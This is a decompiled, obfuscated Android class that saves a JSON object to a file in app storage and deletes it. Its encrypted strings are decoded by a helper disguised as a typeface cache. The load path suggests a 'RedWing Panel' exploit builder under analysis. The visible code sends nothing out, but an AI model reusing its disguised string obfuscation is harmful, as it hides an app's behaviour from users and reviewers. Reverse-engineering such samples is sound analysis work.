package v.s;

import android.content.Context;
import app.mobilex.plus.util.TypefaceCache;
import java.io.File;
import java.io.FileOutputStream;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public abstract class svTwlz04eJVOCrnbfI96 {
    public static final String dDIMxZXP1V8HdM;

    static {
        TypefaceCache.obtain("001300640054009100F900BB00D700B500100040007A008300F100AF00C600A20031");
        dDIMxZXP1V8HdM = TypefaceCache.obtain("003300730055008300F900B100D50098002000790055008900F500BC00C60098003000730049009100F500AD009C00AD003000790055");
    }

    public static void dDIMxZXP1V8HdM(Context context) {
        try {
            File file = new File(context.getFilesDir(), dDIMxZXP1V8HdM);
            if (file.exists()) {
                file.delete();
                TypefaceCache.obtain("000700730057008200E400BA00D600E7");
            }
        } catch (Exception e) {
            TypefaceCache.obtain("000500770052008B00F500BB009200B3002C0036005F008200FC00BA00C600A20063");
            e.getMessage();
        }
    }

    public static void w9sT1Swbhx3hs(Context context, JSONObject jSONObject) {
        String str = dDIMxZXP1V8HdM;
        TypefaceCache.obtain("003000730049009100F500AD");
        try {
            File file = new File(context.getFilesDir(), str);
            byte[] bytes = jSONObject.toString().getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM);
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            try {
                fileOutputStream.write(bytes);
                fileOutputStream.close();
                TypefaceCache.obtain("00100077004D008200F400FF");
                TypefaceCache.obtain("006300750054008900FE00BA00D100B300630072005A009300F100FF009A");
                file.length();
                TypefaceCache.obtain("006300740042009300F500AC009B");
            } catch (Throwable th) {
                try {
                    throw th;
                } catch (Throwable th2) {
                    okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(fileOutputStream, th);
                    throw th2;
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360048008600E600BA0092");
            e.getMessage();
        }
    }
}
